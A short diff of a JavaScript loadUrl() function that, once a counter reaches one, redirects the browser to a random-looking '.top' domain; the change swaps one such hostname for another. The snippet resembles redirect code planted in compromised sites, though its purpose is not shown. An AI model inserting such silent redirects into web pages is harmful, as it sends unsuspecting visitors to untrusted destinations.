@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://hyeiyevverldd.xn--top-8n0aa";
+		var url="https://hyeiyevverldd.top";
 		window.location=url;
 	}
 }
